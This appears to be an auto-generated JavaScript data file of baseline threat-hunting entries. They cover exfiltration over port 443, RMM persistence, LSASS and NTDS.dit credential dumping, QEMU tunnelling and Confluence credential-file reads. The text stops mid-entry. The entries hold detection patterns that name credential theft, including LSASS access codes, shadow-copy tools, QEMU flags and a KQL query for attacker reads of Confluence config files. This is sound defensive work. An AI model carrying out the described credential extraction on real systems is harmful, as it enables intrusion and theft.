// Auto-generated hunt data from markdown files
const HUNTS_DATA = [
  {
    "id": "B001",
    "category": "Embers",
    "title": "Unusual spikes in outbound network traffic over port 443 may indicate unauthorized data exfiltration.",
    "tactic": "Command and Control, Exfiltration",
    "notes": "Establishing normal traffic patterns to detect deviations",
    "tags": [
      "baseline",
      "networktraffic",
      "anomalydetection",
      "T1071.001",
      "T1041"
    ],
    "techniques": [
      "T1071.001",
      "T1041"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://x.com/letswastetime"
    },
    "why": "- Port 443 is commonly used for legitimate HTTPS traffic, making it an attractive channel for attackers to hide data exfil activities within encrypted traffic.\n- By using a well-known port like 443, adversaries can blend malicious traffic with normal traffic, reducing the likelihood of detection by traditional security controls.\n- Spikes in traffic over port 443 can signal an exfil attempt, as attackers may try to move data through encrypted channels that are less scrutinized.",
    "references": "- https://attack.mitre.org/techniques/T1071/001/\n- https://github.com/guardsight/gsvsoc_threat-hunting\n- https://www.splunk.com/en_us/blog/it/understanding-and-baselining-network-behaviour-using-machine-learning-part-i.html",
    "file_path": "Embers/B001.md"
  },
  {
    "id": "B002",
    "category": "Embers",
    "title": "AnyDesk Remote monitoring and management (RMM) tool not writing a file named \"gcapi.dll\" during installation may indicate a malicious version of AnyDesk was installed to establish persistence.",
    "tactic": "Persistence",
    "notes": "Establish a baseline of expected legitimate RMM tool behavior. Profile normal directory paths, remote connection domains, remote IP addresses and files written by RMM tools.",
    "tags": [
      "baseline",
      "persistence",
      "anomalydetection",
      "T1219"
    ],
    "techniques": [
      "T1219"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "John Grageda",
      "link": "https://www.linkedin.com/in/johngrageda/"
    },
    "why": "- RMM tools provide detection evasion, particularly in environments where IT departments use RMM tools for business purposes. \n- 70% increase in adversary use of RMM tools.  \n- AnyDesk normally writes a file named \"gcapi.dll\"; files with other names may be malicious.\n- AnyDesk is typically installed to C:\\ProgramData\\AnyDesk\\AnyDesk.exe by default; other locations may be malicious.\n- AnyDesk cli instalers (exe and MSI versions) run with the --install flag; adversaries typically install AnyDesk with the --silent flag.",
    "references": "- https://attack.mitre.org/techniques/T1219/\n- https://go.crowdstrike.com/rs/281-OBQ-266/images/CrowdStrike2024ThreatHuntingReport.pdf?version=0\n- https://www.nccgroup.com/us/research-blog/the-dark-side-how-threat-actors-leverage-anydesk-for-malicious-activities/",
    "file_path": "Embers/B002.md"
  },
  {
    "id": "B003",
    "category": "Embers",
    "title": "Executables or scripts set in the rdpwd StartupPrograms registry key may indicate that an adversary has achieved persistence by setting a program to execute during an RDP login session.",
    "tactic": "Persistence",
    "notes": "Establish a baseline of expected programs that are set to execute via \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\StartupPrograms\" registry key.",
    "tags": [
      "baseline",
      "persistence",
      "anomalydetection",
      "T1547.001"
    ],
    "techniques": [
      "T1547.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "John Grageda",
      "link": "https://www.linkedin.com/in/johngrageda/"
    },
    "why": "- When a user logs into a computer via RDP, Windows will search for the StartupPrograms registry key in HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\ and execute it. \n- The default value of \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\StartupPrograms\" is rdpclip.\n- Any values other than rdplip will stand out and should be explored.",
    "references": "- https://attack.mitre.org/techniques/T1547/001/\n- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-18---allowing-custom-application-to-execute-during-new-rdp-logon-session\n- https://www.cyberark.com/resources/threat-research-blog/persistence-techniques-that-persist",
    "file_path": "Embers/B003.md"
  },
  {
    "id": "B004",
    "category": "Embers",
    "title": "Identifying anomalous accounts may uncover adversary attempts to maintain persistence to compromised assets.",
    "tactic": "Persistence",
    "notes": "Establish a baseline of expected accounts and consider creating signals/alerts/review processes when new accounts are created.",
    "tags": [
      "baseline",
      "persistence",
      "anomalydetection",
      "sus",
      "T1136"
    ],
    "techniques": [
      "T1136"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jamie Williams",
      "link": "https://x.com/jamieantisocial"
    },
    "why": "- Adversary-created and controlled accounts may provide a persistent backdoor to compromised assets\n- Accounts may be created on various types of assets - including desktops, servers, AD/domain services ([H008](https://github.com/triw0lf/THOR/blob/main/Hunts/Hypothesis-Driven/H008.md)), cloud applications/environments, and edge devices\n- **Note:** Adversaries may also attempt to hide ([T1564.002 - Hide Artifacts: Hidden Users](https://attack.mitre.org/techniques/T1564/002/)) or otherwise conceal created accounts. Very commonly, malicious accounts will try to mimic common naming conventions, or even match those of the victim environment ([T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/))",
    "references": "- [T1136 - Create Account](https://attack.mitre.org/techniques/T1136/)\n- [Windows Security Log Event ID 4720: A user account was created](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4720)\n- [Active Directory accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts)",
    "file_path": "Embers/B004.md"
  },
  {
    "id": "B005",
    "category": "Embers",
    "title": "Adversaries are exploiting the native Windows process Rundll32 in order to execute malicious code and bypass application control solutions.",
    "tactic": "Execution, Defense Evasion",
    "notes": "The scope of this hunt could become too wide without defining an area of focus. For one hunt, it might be best to pursue one category of visibility such as command,k process, or module monitoring.",
    "tags": [
      "execution",
      "defenseevasion",
      "lolbin",
      "rundll32",
      "T1218.011"
    ],
    "techniques": [
      "T1218.011"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Claire Stromboe",
      "link": "https://x.com/csthreathunting"
    },
    "why": "- A successful attack usually means legitimate DLLs or functions are abused, or malicious adversary-supplied DLLs are executed\n- Objectives may be accomplished on payload installation/execution, credential theft, or broader goals such as data theft\n- Associated with QakBot, APT28, APT29, Lazarus Group, and many more",
    "references": "- https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation\n- https://redcanary.com/threat-detection-report/techniques/rundll32/\n- https://lolbas-project.github.io/lolbas/Binaries/Rundll32/\n- https://attack.mitre.org/techniques/T1218/011/",
    "file_path": "Embers/B005.md"
  },
  {
    "id": "B006",
    "category": "Embers",
    "title": "Adversaries are leveraging suspicious browser extensions to collect and exfiltrate sensitive data.",
    "tactic": "Collection, Exfiltration",
    "notes": "The scope of this hunt could become too wide without defining what is considered known good browser extensions. Consider focusing your first baseline on a subsection of the business, specific browser, or by excluding allowed extensions.",
    "tags": [
      "collection",
      "exfiltration",
      "browserextensions",
      "T1176",
      "T1005"
    ],
    "techniques": [
      "T1176",
      "T1005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Threat actors are known to leverage unauthorized browser extensions to exfiltrate data in a way that blends in with normal browsing traffic\n- You may discover suspicious or malicious browser extensions that are performing other unwanted behaviors\n- Similar to unauthorize programs, browser extensions can introduce risk both from an acceptable use violation and malicious perspective",
    "references": "- https://cloud.google.com/blog/topics/threat-intelligence/lnk-between-browsers/\n- https://www.securityweek.com/attackers-leverage-locally-loaded-chrome-extension-data-exfiltration/\n- https://www.trendmicro.com/en_us/research/23/k/parasitesnatcher-how-malicious-chrome-extensions-target-brazil-.html\n- https://www.zscaler.com/blogs/security-research/kimsuky-deploys-translatext-target-south-korean-academia",
    "file_path": "Embers/B006.md"
  },
  {
    "id": "B007",
    "category": "Embers",
    "title": "Adversaries are automatically exfiltrating email data using email forwarding rules.",
    "tactic": "Collection, Exfiltration",
    "notes": "Email forwarding rules may be disabled in your organization, it may be beneficial to see what rules were setup regardless of success to identify potential malicious activity.",
    "tags": [
      "collection",
      "exfiltration",
      "email",
      "mailforwarding",
      "T1114.003",
      "T1020"
    ],
    "techniques": [
      "T1114.003",
      "T1020"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Threat actors may abuse mail forwarding rules, which are easy to setup in most corporate mail applications, to exfiltrate or monitor a compromised mailbox\n- Any user can create mail forwarding rules without permission escalation, unless corporate settings lock down the capability",
    "references": "- https://www.microsoft.com/en-us/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/\n- https://www.documentcloud.org/documents/20418317-fbi-pin-bc-cyber-criminals-exploit-email-rule-vulerability-11252020/\n- https://www.splunk.com/en_us/blog/security/hunting-m365-invaders-dissecting-email-collection-techniques.html\n- https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-341a",
    "file_path": "Embers/B007.md"
  },
  {
    "id": "B008",
    "category": "Embers",
    "title": "Threat actors added an existing or newly created (B004) user to a privileged Active Directory (AD) security group to maintain persistence or achieve other objectives in an elevated context.",
    "tactic": "Privilege Escalation",
    "notes": "Establish a baseline for additions to privileged AD security groups using Windows event logs (e.g., 4732, 4728, 4756). Suggested target security groups include (built-in) Administrators, Domain Admins, Enterprise Admins, and Schema Admins. See reference 1 (R1) for a suggested list of security groups, the prioritization of specific groups is likely to depend on the defender's environment.",
    "tags": [
      "baseline",
      "privilege_escalation",
      "anomalydetection",
      "T1098"
    ],
    "techniques": [
      "T1098"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jon Perez",
      "link": "https://bsky.app/profile/j-nohandle.bsky.social"
    },
    "why": "- Threat actors abuse privileged AD security groups to provide an account they control with an elevated context to achieve additional objectives/tactics.\n- Performing this baseline enables defenders quickly identify and investigate additions to privileged AD groups.\n- Defenders will learn more about their environment and are likely to find internal data sources that will help determine the disposition of the addition to the security group.",
    "references": "- https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory\n- https://attack.mitre.org/techniques/T1098/\n- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-security-group-management",
    "file_path": "Embers/B008.md"
  },
  {
    "id": "B009",
    "category": "Embers",
    "title": "Microsoft Playwright testing framework caches versions of various browsers for automated testing. In some version or configurations of this framework, the Firefox version is based on Firefox's Nightly.app, the developer-facing and, by Mozilla's own admission, least stable and secure version of the app. EDRs may flag this version of the app (often saved in this file hierarchy/structure: _\"~/Library/Caches/ms-playwright/firefox-<4-digit version number>/firefox/Nightly.app\"_) as vulnerable and thus a security concern. These vulnerable apps should be reviewed to determine (1) that it is indeed a legitimate file and not a spoof and (2) whether even a legitimate version of the app should be allowed. Dependencies for testing frameworks should be reviewed and allowed/disallowed as necessary.",
    "tactic": "Defense Evasion (TA0005), Trusted Developer Utilities Proxy Execution (T1127), Masquerading (T1036), Exploitation for Defense Evasion (T1211)",
    "notes": "Awareness should be raised about the flagging of Firefox Nightly.app by EDRs and the necessity for validating all dependencies associated with testing frameworks.",
    "tags": [
      "defenseevasion",
      "masquerading",
      "trusteddeveloperutilities",
      "proxyexecution",
      "T1036",
      "T1127",
      "T1211"
    ],
    "techniques": [
      "T1036",
      "T1127",
      "T1211"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Joshua Hines",
      "link": ""
    },
    "why": "- This hunt highlights the dangers of dependencies within frameworks; as stated above, many were unaware of the apps existence as no one had manually downloaded it.\n- Exploitation of testing frameworks can lead to higher-level access of systems.\n- As the vulnerability is related to developer utilities (Microsoft Playwright testing framework), it could be an unexpected foothold into the development environment.",
    "references": "- https://attack.mitre.org/tactics/TA0005/\n- https://attack.mitre.org/techniques/T1127/\n- https://attack.mitre.org/techniques/T1036/\n- https://attack.mitre.org/techniques/T1211/\n- https://www.firefox.com/en-US/firefox/144.0a1/releasenotes/",
    "file_path": "Embers/B009.md"
  },
  {
    "id": "B010",
    "category": "Embers",
    "title": "Establish a normal behavior baseline for VPC peering across your AWS environment, so that future deviations (e.g., unauthorized peering, unusual traffic patterns) can be more easily hunted/detected. Peering may be normal in your environment, but this is an opportunity to not only understand your cloud environment on a deeper level, but to collaborate with other teams to ensure the proper controls are in place.",
    "tactic": "Lateral Movement",
    "notes": "Explore typical peering requests, initiators, unusual IPs, and connection events.",
    "tags": [
      "lateralmovement",
      "T1599",
      "T1021"
    ],
    "techniques": [
      "T1599",
      "T1021"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Bruce Breuer",
      "link": ""
    },
    "why": "The hunt helps establish a baseline for VPC peering activity, enabling detection of lateral movement in the cloud. It also supports risk reduction through targeted arcitecture review and enhances overall visibility into cloud network operations.",
    "references": "https://www.wiz.io/academy/what-is-lateral-movement\nhttps://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html",
    "file_path": "Embers/B010.md"
  },
  {
    "id": "B011",
    "category": "Embers",
    "title": "Establish a normal utilization of Xcode and Xcode projects across workstations/servers. Xcode projects are commonly used by software developers and can be targeted by MacOS malware.",
    "tactic": "Initial Access",
    "notes": "Indicators of Xcode usage can be found in EDR telemetry and potential for detection if Xcode is not utilized/approved in the environment.",
    "tags": [
      "initialaccess",
      "baseline",
      "T1195.001"
    ],
    "techniques": [
      "T1195.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Collin McClaine",
      "link": ""
    },
    "why": "- Xcode projects can be infected and the malware can propagate when Xcode projects are shared by developers. \n\n- Potential to uncover shadow IT use of Xcode in an environment to develop unapproved applications. This Also leaves developers at risk to interacting with infected Xcode projects. \n\n- Understand exposure to potential infected Xcode project by knowing where Xcode is utilized in the environment.",
    "references": "https://attack.mitre.org/software/S0658/\nhttps://www.microsoft.com/en-us/security/blog/2025/09/25/xcsset-evolves-again-analyzing-the-latest-updates-to-xcssets-inventory/\nhttps://attack.mitre.org/techniques/T1195/001/\nhttps://attack.mitre.org/tactics/TA0001/",
    "file_path": "Embers/B011.md"
  },
  {
    "id": "B012",
    "category": "Embers",
    "title": "Baseline all non-human identities associated with AI agents, automation frameworks, and agentic tools across the environment to identify orphaned service accounts from decommissioned agents that retain active permissions.",
    "tactic": "Persistence",
    "notes": "AI agent deployments are accelerating but no lifecycle management standard exists for their identities. Orphaned agent accounts with API keys, OAuth tokens, and service principals persist long after the agent is decommissioned — retaining permissions with no owner and no monitoring.",
    "tags": [
      "persistence",
      "non_human_identity",
      "service_account",
      "ai_agent",
      "orphan_account",
      "lifecycle",
      "T1078.004"
    ],
    "techniques": [
      "T1078.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- AI agents are provisioned with service accounts, API keys, and OAuth tokens that often carry broad permissions — but unlike human accounts, they are rarely included in offboarding or access review processes when the agent is retired\n- Orphaned agent identities are attractive targets for adversaries because they have established permissions, generate no regular user activity to compare against, and are unlikely to trigger password rotation or MFA challenges\n- Baselining agent identities requires correlating across identity providers, cloud IAM, SaaS platforms, and CI/CD systems to build a complete inventory — most organizations have no single view of how many agent identities exist or who owns them\n- Establishing this baseline enables detection of dormant account reactivation, permission escalation on unowned accounts, and identifies accounts that should be decommissioned to reduce the organization's attack surface",
    "references": "- [MITRE ATT&CK T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)\n- [The Hacker News - How to Gain Control of AI Agents and Non-Human Identities (Sep 2025)](https://thehackernews.com/2025/09/how-to-gain-control-of-ai-agents-and.html)\n- [BleepingComputer - AI Agent Identity Management: A New Security Control Plane for CISOs (Feb 2026)](https://www.bleepingcomputer.com/news/security/ai-agent-identity-management-a-new-security-control-plane-for-cisos/)\n- [Okta - What Are Non-Human Identities and How to Secure Them (Aug 2025)](https://www.okta.com/identity-101/what-are-non-human-identities/)",
    "file_path": "Embers/B012.md"
  },
  {
    "id": "B013",
    "category": "Embers",
    "title": "Baseline all processes that legitimately access lsass.exe in the environment to identify anomalous access attempts indicative of credential dumping tools such as Mimikatz, procdump, or comsvcs.dll MiniDump.",
    "tactic": "Credential Access",
    "notes": "Establish a baseline using Sysmon Event ID 10 (ProcessAccess) where TargetImage ends with lsass.exe. Profile normal SourceImage values, GrantedAccess codes, and calling process signatures. Legitimate accessors typically include csrss.exe, services.exe, svchost.exe, lsm.exe, and the installed EDR/AV agent. Any unsigned or unexpected process accessing LSASS — particularly with GrantedAccess values 0x1010, 0x1410, or 0x1FFFFF — warrants immediate investigation.",
    "tags": [
      "baseline",
      "credential_access",
      "lsass",
      "sysmon",
      "process_access",
      "T1003.001"
    ],
    "techniques": [
      "T1003.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- LSASS holds cached credentials for every interactive and service logon on a Windows host — it is the single highest-value target for credential theft, and virtually every ransomware intrusion includes an LSASS dump as a prerequisite to lateral movement\n- The set of processes that legitimately access LSASS is small and stable — typically fewer than 10 system binaries and the installed security agent — making this one of the cleanest baselines to establish and maintain\n- Credential dumping tools use distinctive GrantedAccess values (0x1010 for PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ) that differ from the access patterns of legitimate system processes, providing a high-fidelity detection signal once the baseline is established\n- Attackers increasingly use living-off-the-land approaches (comsvcs.dll MiniDump via rundll32, Task Manager dumps) that evade signature-based detection — a baseline approach catches these because the anomaly is the access to LSASS itself, not the specific tool used",
    "references": "- [MITRE ATT&CK T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)\n- [The DFIR Report - Apache ActiveMQ Exploit Leads to LockBit Ransomware](https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/)\n- [Microsoft - Sysmon Event ID 10 ProcessAccess](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)\n- [Microsoft - How Credential Guard Works](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works)\n- [Microsoft - Configure Additional LSA Protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)\n- [Splunk - You Bet Your Lsass: Hunting LSASS Access](https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html)\n- [TrustedSec Sysmon Community Guide - Process Access](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/process-access.md)",
    "file_path": "Embers/B013.md"
  },
  {
    "id": "B014",
    "category": "Embers",
    "title": "Baseline the sources and parent processes of MSI package installations across the environment to identify installations originating from unusual locations such as browser download directories, Temp folders, or remote URLs.",
    "tactic": "Defense Evasion",
    "notes": "Establish a baseline using Windows Installer Event IDs 1033 and 1040, Sysmon Event ID 1 for msiexec.exe process creation, and application logs showing MSI source paths. Profile normal installation sources (SCCM/MECM distribution points, GPO software deployment shares, vendor update services) and parent processes (sccm client, GPO, software updaters). Flag MSI installations where the source path is a user's Downloads folder, browser cache, %TEMP%, or an HTTP/HTTPS URL.",
    "tags": [
      "baseline",
      "defense_evasion",
      "msiexec",
      "msi",
      "software_installation",
      "T1218.007"
    ],
    "techniques": [
      "T1218.007"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- In the Bumblebee-to-Akira intrusion, a trojanized MSI installer downloaded via a poisoned search result was the initial infection vector — the MSI source path (browser download directory) would have been anomalous compared to the organization's normal software deployment channels\n- Enterprise environments typically deploy MSI packages through centralized management tools (SCCM, Intune, GPO) with consistent source paths — an MSI running from a user's Downloads folder or from an HTTP URL is abnormal and easy to detect once the baseline is established\n- The set of legitimate MSI installation sources is small and stable in most organizations, making this a low-noise baseline that produces actionable alerts with minimal tuning\n- This baseline also surfaces shadow IT installations, unauthorized software, and policy violations alongside malicious activity, providing additional security value beyond threat detection",
    "references": "- [MITRE ATT&CK T1218.007 - System Binary Proxy Execution: Msiexec](https://attack.mitre.org/techniques/T1218/007/)\n- [The DFIR Report - From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira](https://thedfirreport.com/2025/11/04/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/)\n- [Elastic Detection Rule - Suspicious Execution via MSIEXEC](https://www.elastic.co/guide/en/security/current/suspicious-execution-via-msiexec.html)\n- [Splunk - Windows System Binary Proxy Execution MSIExec Analytics Story](https://research.splunk.com/stories/windows_system_binary_proxy_execution_msiexec/)\n- [LOLBAS Project - Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)",
    "file_path": "Embers/B014.md"
  },
  {
    "id": "B015",
    "category": "Embers",
    "title": "Baseline all executions of ntdsutil.exe, wbadmin.exe, vssadmin.exe, and diskshadow.exe on domain controllers to identify usage outside of scheduled Active Directory maintenance windows that may indicate credential extraction.",
    "tactic": "Credential Access",
    "notes": "Establish a baseline using Sysmon Event ID 1 (process creation) and Windows Security Event ID 4688 with command-line auditing enabled on all domain controllers. Profile when these tools normally run (backup windows, patching cycles, DC promotion), who runs them (specific service accounts, backup software), and what arguments are used. Any execution outside these known patterns — especially ntdsutil with IFM arguments, wbadmin targeting system state, or vssadmin creating shadow copies — warrants immediate investigation. Also monitor Directory Service Event ID 1917 (ntds.dit backup).",
    "tags": [
      "baseline",
      "credential_access",
      "ntdsutil",
      "wbadmin",
      "vssadmin",
      "domain_controller",
      "active_directory",
      "T1003.003"
    ],
    "techniques": [
      "T1003.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Ntdsutil, wbadmin, and vssadmin are the primary tools used to extract the NTDS.dit database containing all domain credential hashes — in the Bumblebee-to-Akira intrusion, wbadmin was used to dump NTDS.dit from the domain controller\n- These tools have very few legitimate use cases on domain controllers — ntdsutil for AD maintenance and IFM media creation, wbadmin for system state backups, vssadmin for shadow copy management — and those legitimate uses follow predictable schedules tied to backup windows and maintenance cycles\n- The baseline is exceptionally tight: most domain controllers see these tools run only during weekly or monthly maintenance windows by specific service accounts, making any execution outside that pattern a high-fidelity alert\n- Because these are signed Microsoft binaries pre-installed on every domain controller, signature-based detection will not flag them — behavioral baselining based on timing, user context, and command-line arguments is the primary detection method",
    "references": "- [MITRE ATT&CK T1003.003 - OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)\n- [The DFIR Report - From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira](https://thedfirreport.com/2025/11/04/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/)\n- [Splunk - Detection: Ntdsutil Export NTDS](https://research.splunk.com/endpoint/da63bc76-61ae-11eb-ae93-0242ac130002/)\n- [Insane Cyber - Hunting for APT28/Hafnium NTDS.dit Credential Harvesting](https://insanecyber.com/hunting-for-apt28-hafnium-ntds-dit-domain-controller-credential-harvesting-mitre-attck-t1003-003/)\n- [Red Canary Atomic Red Team - T1003.003 NTDS](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md)",
    "file_path": "Embers/B015.md"
  },
  {
    "id": "B016",
    "category": "Embers",
    "title": "What does normal virtual machine and hypervisor binary usage look like across endpoints — which hosts legitimately run QEMU, VirtualBox, or VMware Workstation, and what are the expected binary paths, network patterns, and disk image locations?",
    "tactic": "Defense Evasion",
    "notes": "Data collection (30 days): Collect process creation events for VM binaries: qemu-system-*.exe, VBoxManage.exe, VirtualBoxVM.exe, vmware.exe, vmrun.exe, vmwp.exe (Hyper-V worker), wsl.exe, utm (macOS). Record: hostname, username, binary path, binary hash, command-line arguments, parent process, and outbound network connections per session. Build the allowlist: Categorize each host as approved (developer workstations, QA, IT admin) or unapproved. For approved hosts, document expected binary paths (C:\\Program Files\\Oracle\\VirtualBox\\, C:\\Program Files\\QEMU\\), expected disk image locations, and typical network volume. Immediate flags (no baseline needed): VM binaries executing from ProgramData, Temp, AppData, Downloads, or any user-writable path. Headless flags: `-nographic`, `-display none`, `-daemonize`. NAT user-mode networking: `-nic user` or `-netdev user` (tunnels all traffic through host process, used in STXRAT and Payouts King). Minimal memory allocation: `-m 256M` or lower with tiny disk images. Disk image monitoring: Hunt for VM image files (.qcow2, .vmdk, .vdi, .raw, .vhd, .vhdx) in non-standard locations. Flag images < 200MB — legitimate dev VMs are typically >1GB, attack-focused Alpine/BusyBox images are ~50-100MB. Disk images disguised with non-VM extensions (.dll, .db) as seen in Payouts King. Network baseline: Establish per-host outbound volume from VM processes. Sustained high-volume outbound connections (hours of continuous transfer) from QEMU on a host that isn't a development machine is a strong exfil indicator. Output: Produce a host allowlist with approved VM binaries, paths, users, and network thresholds. This baseline directly enables detection for H127 (rclone+QEMU exfil tunnel).",
    "tags": [
      "defense_evasion",
      "baseline",
      "virtual_machine",
      "qemu",
      "evasion"
    ],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- VM-based evasion is accelerating — Sophos documented two distinct campaigns (STAC4713/Payouts King and STAC3725) using QEMU as network proxies since late 2025, and Securelist documented QEMU network tunneling in the wild in 2024 — without a baseline, these deployments are invisible on hosts where VMs are expected\n- The STXRAT case demonstrated QEMU deployed to ProgramData with a minimal Alpine image to proxy rclone WebDAV exfiltration — the Payouts King campaign disguised disk images as .dll and .db files and used scheduled tasks (\"TPMProfiler\") to persist headless VMs with SYSTEM privileges\n- VMs create a network boundary that breaks EDR visibility entirely — security tools on the host cannot inspect traffic or processes inside the guest OS, making the baseline of authorized VM usage the primary detection layer\n- Legitimate VM usage is highly concentrated (developers, QA, IT admins) and follows predictable patterns — the ratio of hosts that legitimately run VMs to total endpoints is typically <5%, making unauthorized VM deployment a high-signal detection",
    "references": "- [MITRE ATT&CK T1564.006 - Hide Artifacts: Run Virtual Instance](https://attack.mitre.org/techniques/T1564/006/)\n- [Deception.Pro - Trojanized CPU-Z Delivers STXRAT, Steals Credentials, and Exfils Data](https://blog.deception.pro/blog/cpuz-trojan-stxrat-purelogs-data-exfil-april-2026)\n- [Securelist (Kaspersky) - Network Tunneling with QEMU](https://securelist.com/network-tunneling-with-qemu/111803/)\n- [BleepingComputer - Payouts King Ransomware Uses QEMU VMs to Bypass Endpoint Security](https://www.bleepingcomputer.com/news/security/payouts-king-ransomware-uses-qemu-vms-to-bypass-endpoint-security/)\n- [TrustedSec - Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)\n- [Detection.FYI - Potentially Suspicious Usage of QEMU (Sigma Rule)](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_qemu_suspicious_execution/)\n- [Red Canary Atomic Red Team - T1564.006 Run Virtual Instance](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.006/T1564.006.md)\n- [Elastic - Virtual Machine Execution in Directory Masquerading as System Directory](https://www.elastic.co/guide/en/security/current/virtual-machine-fingerprinting.html)",
    "file_path": "Embers/B016.md"
  },
  {
    "id": "B017",
    "category": "Embers",
    "title": "What does legitimate access to Atlassian Confluence credential and configuration files look like on the Linux host running Confluence — which service accounts, which Java process lineages, and which administrative workflows read `server.xml`, `confluence.cfg.xml`, and `setenv.sh` — so that the attacker-driven `cat`/`grep`/`awk` of those files (the pivot point in the Microsoft F5/Confluence intrusion) becomes a high-fidelity outlier rather than a noisy alert.",
    "tactic": "Credential Access",
    "notes": "Platform: Linux (Confluence/Atlassian hosts). Microsoft Security Blog \"From edge appliance to enterprise compromise\" (May 22, 2026) showed the attacker extracted the `Jiraservices` domain-account credentials by reading `/opt/atlassian/confluence/conf/server.xml` and `/var/atlassian/application-data/confluence/confluence.cfg.xml` during an SSH session pivoted from an F5 BIG-IP (see [[H166]]). Microsoft published the KQL: `DeviceProcessEvents | where InitiatingProcessFileName == \"java\" | where (FileName == \"cat\" and ProcessCommandLine has_any (\"server.xml\", \"confluence.cfg.xml\" , \"setenv.sh\"))`. **Data collection (30 days)** — across every Linux host running Atlassian Confluence, Jira, Crowd, Bitbucket, or Bamboo, collect for each access to `/opt/atlassian/*/conf/server.xml`, `/var/atlassian/application-data/*/confluence.cfg.xml`, `/opt/atlassian/*/bin/setenv.sh`, `*/dbconfig.xml`, `*/jira-config.properties`, and any file under `*/conf/` or `*/.ssh/`: (1) accessing username (UID), (2) process name and full command-line, (3) parent process and grandparent (the lineage must include whether the read came from a backup agent, an Ansible/Chef/Puppet run, a Splunk/Elastic universal forwarder, an admin shell, or the `java` JVM itself), (4) source IP if accessed over SSH, (5) wall-clock time and inter-access interval. Sources: Linux **auditd** (`-a always,exit -F arch=b64 -S openat -F path=/opt/atlassian -k atlassian_config`), Defender for Endpoint `DeviceFileEvents` joined to `DeviceProcessEvents`, osquery `file_events` + `process_events`, or Falco `open_read` rule scoped to those paths. **Build the allowlist**: per Confluence host, document the set of approved readers — typically: the `confluence` service account during JVM startup (parent=`systemd`, command=`java -jar ... -Dconfluence.home=...`), backup jobs (`tar`, `rsync`, `borg`, `restic` with documented backup-runner UID), configuration management agents (`puppet`, `chef-client`, `ansible-runner`), and named on-call SREs during change-window SSH sessions. **Deliverable format**: a per-host allowlist of `(UID, process, parent process, expected cadence)` tuples, plus a **block of patterns flagged immediately without waiting for the baseline to 